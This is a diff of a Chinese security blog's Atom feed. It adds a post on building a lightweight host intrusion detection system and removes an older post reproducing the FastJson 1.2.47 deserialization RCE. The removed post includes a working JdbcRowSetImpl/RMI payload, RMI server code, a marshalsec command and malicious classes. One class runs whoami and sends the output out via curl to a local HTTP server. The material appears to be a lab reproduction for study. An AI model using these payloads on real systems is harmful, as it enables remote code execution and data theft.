@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="/"/>
-  <updated>2019-12-28T14:57:06.000Z</updated>
+  <updated>2020-01-10T04:40:12.100Z</updated>
   <id>/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>中小型企业自研HIDS简单实现</title>
+    <link href="/2020/01/%E4%B8%AD%E5%B0%8F%E5%9E%8B%E4%BC%81%E4%B8%9A%E8%87%AA%E7%A0%94HIDS%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/"/>
+    <id>/2020/01/中小型企业自研HIDS简单实现/</id>
+    <published>2020-01-10T03:51:09.000Z</published>
+    <updated>2020-01-10T04:40:12.100Z</updated>
+    
+    <content type="html"><![CDATA[<p>此HIDS自研面对中小型企业，一般服务器百级。如果对集群部署，系统获取更加完善灵活，服务量级较高可以参考：</p><ol><li><a href="https://github.com/ysrc/yulong-hids" target="_blank" rel="noopener">驭龙</a></li><li><a href="https://tech.meituan.com/2019/01/17/distributed-hids-cluster-architecture-design.html" target="_blank" rel="noopener">美团</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MjE4MDc4OQ==&amp;mid=2247483961&amp;idx=1&amp;sn=2736aad509f08c20d82cfc08b62da27a&amp;chksm=ec040463db738d754cce84506c098caca891b58740e1b38b3621f752f805eb1c02ebf0e2ac73&amp;mpshare=1&amp;scene=1&amp;srcid=1226ZgmHAUTfeYMuLFPWyuHS#rd" target="_blank" rel="noopener">点融</a></li><li><a href="https://misakikata.github.io/2019/12/OSSEC-Wazuh/" target="_blank" rel="noopener">Wazuh</a></li></ol><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p>架构采用，一般中小型企业安全人员较少，重视度远不如大型企业，多见“一个人的安全部”。架构不适宜过于复杂，后端开发可以根据实际采用python，go，Java等。web框架，有django，php都可以使用。消息的被动或者主动获取又涉及到是否需要使用ES或者ActiveMQ。这一点后面再讨论。此处使用平安集团分享的一个预警结构流程。</p><p><img src="https://i.loli.net/2020/01/10/WpozHBZAmJLiO4U.png" alt="1578622803994.png"></p><h3 id="Agent"><a href="#Agent" class="headerlink" title="Agent"></a>Agent</h3><p>agent的建设是整个流程中最费劲的事情了。需要以下几种特点</p><ol><li>可维护性高，获取信息稳定</li><li>对系统侵入小，适合多种系统的多版本内核</li><li>通道信息安全，进程可维护</li><li>支持灵活检测，负载小</li><li>便于一键化部署</li></ol><p>对于互联网大厂采用的方案多是hook，audit等。hook的侵入性比较高，在没有专门的定制化开发下，中小型企业使用的成本比较高，之前在试图部署驭龙的时候就发现太容易对系统造成崩溃。这是生产系统不能接受的。</p><p>如何选择侵入小，兼容高，信息全，成本低就是主要考虑了。</p><p>对文件监控上比较好的开源监控也就是aide和inotify-tools。aide是对文件的hash比较来判断文件的改动，无实时性。inotify是实时监控，倾向于此。在实际系统测试上，对各个Linux的发行版兼容性也可以满足需求。</p><p>其他信息的获取上，倾向于python库psutil。这是Linux的运维的第三方模块。可以收集很多Linux系统的信息，进程，网络，用户，内存等。可以跟主机做实时的信息获取。而且实现简单，方便跟inotify做联动。</p><p>信息推送上，如果考虑实时性，可以使用agent主动推送的信息实现方案，但这样做会面临多服务的压力，延迟，丢失。所以需要对信息做消息处理，就需要消息队列。采用何种方式根据需求选择。</p><p>agent被动提供消息，只需要把获取的信息提交到某个特定的地址。比如，此处使用类似ES的信息提供方式，agent获取信息后交给flask以json来展示，server对agent来做守护任务来被动获取。这样，实时性较低，需要对获取的信息做过滤处理。但消息获取上比较稳定。</p><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>server端主要做信息的展示和处理整合，此处直接使用python-django。如果使用被动获取信息，需要server做定时任务，采用任务框架APScheduler来管理定时任务。</p><p>简而言之，实现方便，操作简单。server端还真是没有多少值得谈论。</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>虽然名为HIDS，但还是需要一些其他功能，只是agent传输的文件监控和主机的信息仿佛作用较低。而且在监控中可以看到，当服务文件改动较多的时候，提示的预警信息过于频繁。分析较为困难。所以为了便于发现其中存在的问题，使用文件扫描功能，比如Linux下的河马webshell扫描。调用扫描来对预警文件进行判断，但扫描识别率测试中，只有百分之六十到七十左右。识别率是否能接受就看个人情况拉。</p><p>同时，对于感染型后门，我增加了一个对威胁信息的检测。从以下地址获取感染IP：</p><p><a href="http://osint.bambenekconsulting.com" target="_blank" rel="noopener">http://osint.bambenekconsulting.com</a></p><p><a href="https://feodotracker.abuse.ch" target="_blank" rel="noopener">https://feodotracker.abuse.ch</a></p><p>通过网络连接来判断是否有类似的感染发生，对于IP的获取同样使用定时任务。</p><h3 id="web日志"><a href="#web日志" class="headerlink" title="web日志"></a>web日志</h3><p>目前想通过web日志的方式来做检测告警，比如，大量文件的变更时，跟web日志做查询，来判断是否是一个外部创建的文件。通过ES日志服务器来整合，但在实现中发现，不一定创建成功的文件就一定在日志中，就像文件重命名。所以此功能具体的实现还有待考究。</p><p>如果后期可以发现一种webshell识别较高的情况，可以使用扫描价web日志联合告警的方式来减少预警的情况下，提高准确度。</p><p>由于使用上没有采用agent主动推送，没用参考消息队列，后期准备改为推送和消息队列形式，同时增加对文件检测的识别和减少告警。同时希望agent的信息获取可以使用audit的方式。</p><p>以下是代码实现，简单到会django就可以做二次修改哦</p><p><a href="https://github.com/MisakiKata/zeru" target="_blank" rel="noopener">zeru</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;此HIDS自研面对中小型企业，一般服务器百级。如果对集群部署，系统获取更加完善灵活，服务量级较高可以参考：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/ysrc/yulong-hids&quot; target=&quot;_blank&quot; rel=&quot;noo
+      
+    
+    </summary>
+    
+    
+      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
+    
+  </entry>
   
   <entry>
     <title>逆向打卡APP</title>
@@ -470,29 +495,6 @@ commons-logging-1.2.jar
       
         &lt;h3 id=&quot;Redis主从复制&quot;&gt;&lt;a href=&quot;#Redis主从复制&quot; class=&quot;headerlink&quot; title=&quot;Redis主从复制&quot;&gt;&lt;/a&gt;Redis主从复制&lt;/h3&gt;&lt;p&gt;redis主从复制，前几天分享的新版redis未授权利用的新型方式。&lt;/p&gt;
 &lt;p&gt;
-      
-    
-    </summary>
-    
-    
-      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>FastJson 反序列化</title>
-    <link href="/2019/07/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    <id>/2019/07/FastJson-反序列化/</id>
-    <published>2019-07-15T02:16:07.000Z</published>
-    <updated>2019-07-15T02:35:30.420Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="FastJson-反序列化"><a href="#FastJson-反序列化" class="headerlink" title="FastJson 反序列化"></a>FastJson 反序列化</h3><p>前一段时间HW护出来一个FastJson的RCE。网上遍布了利用的poc。此处简单模拟一下触发流程。</p><p>先下载1.2.47的FastJson，地址：<a href="http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar" target="_blank" rel="noopener">http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar</a></p><p>利用的JDK为，java_8u60。地址：<a href="https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe" target="_blank" rel="noopener">https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe</a></p><p>使用的IDE为IDEA，下载FastJson后导入IDEA。</p><p>从File - Project Structure - Modules - Dependencies导入</p><p>创建poc为如下：</p><pre><code>import com.alibaba.fastjson.JSON;public class poc {    public static void main(String[] argv) {        String payload = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},&quot; +                &quot;\&quot;xxxx\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:&quot; +                &quot;\&quot;rmi://localhost:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:true}}}&quot;;        JSON.parse(payload);    }}</code></pre><p><img src="\2019\07\FastJson-反序列化\1563011101595.png" alt="1563011101595"></p><p>创建一个RMI服务器。可以利用如下的JAVA代码。</p><pre><code>import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class rmiServer {    public static void main(String[] args) throws Exception {        Registry registry = LocateRegistry.createRegistry(1099);        Reference reference = new Reference(&quot;Exloit&quot;,                &quot;Exploit&quot;,&quot;http://localhost:8000/&quot;);        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);        registry.bind(&quot;Exploit&quot;,referenceWrapper);    }}</code></pre><p>或者采用mar创建一个RMI服务器。</p><pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Exploit</code></pre><p>再开启一个HTTP服务，下面写入一个恶意class文件。</p><pre><code>import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;import java.io.IOException;import java.util.Hashtable;public class Exploit implements ObjectFactory {    @Override    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) {        exec(&quot;xterm&quot;);        return null;    }    public static String exec(String cmd) {        try {            Runtime.getRuntime().exec(&quot;calc&quot;);        } catch (IOException e) {            e.printStackTrace();        }        return &quot;&quot;;    }    public static void main(String[] args) {        exec(&quot;123&quot;);    }}</code></pre><p>此处利用mar创建的RMI服务器来验证：</p><p><img src="\2019\07\FastJson-反序列化\1563012977594.png" alt="1563012977594"></p><p>查看HTTP服务，可以看到请求的恶意class请求。</p><p><img src="\2019\07\FastJson-反序列化\1563013067020.png" alt="1563013067020"></p><p>如果请求了RMI服务后一直卡在没有请求HTTP服务的话，可以查看一下防火墙设置。我就不说卡在这里多久了。23333</p><p>当然如果也可以使用之前老RCE的恶意class文件</p><pre><code>import java.io.BufferedInputStream;import java.io.BufferedReader;import java.io.InputStreamReader;public class exploit2 {    public static String exec(String cmd) throws Exception {        String sb = &quot;&quot;;        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));        String lineStr;        while ((lineStr = inBr.readLine()) != null)            sb += lineStr + &quot;\n&quot;;        inBr.close();        in.close();        return sb;    }    public exploit2() throws Exception {        String result = &quot;&quot;;        result = exec(&quot;whoami&quot;);        String cmd=&quot;curl http://localhost:8000/&quot;+result;        throw new Exception(exec(cmd));    }    public static void main(String[] args) throws Exception {        String result = &quot;&quot;;        result = exec(&quot;whoami&quot;);        String cmd=&quot;curl http://localhost:8000/&quot;+result;        throw new Exception(exec(cmd));    }}</code></pre><p>执行后，查看携带响应的请求</p><p><img src="\2019\07\FastJson-反序列化\1563013609323.png" alt="1563013609323"></p><p>内容部分POC来源：<a href="https://www.03sec.com/3240.shtml" target="_blank" rel="noopener">https://www.03sec.com/3240.shtml</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;FastJson-反序列化&quot;&gt;&lt;a href=&quot;#FastJson-反序列化&quot; class=&quot;headerlink&quot; title=&quot;FastJson 反序列化&quot;&gt;&lt;/a&gt;FastJson 反序列化&lt;/h3&gt;&lt;p&gt;前一段时间HW护出来一个FastJson的RCE。网
       
     
     </summary>
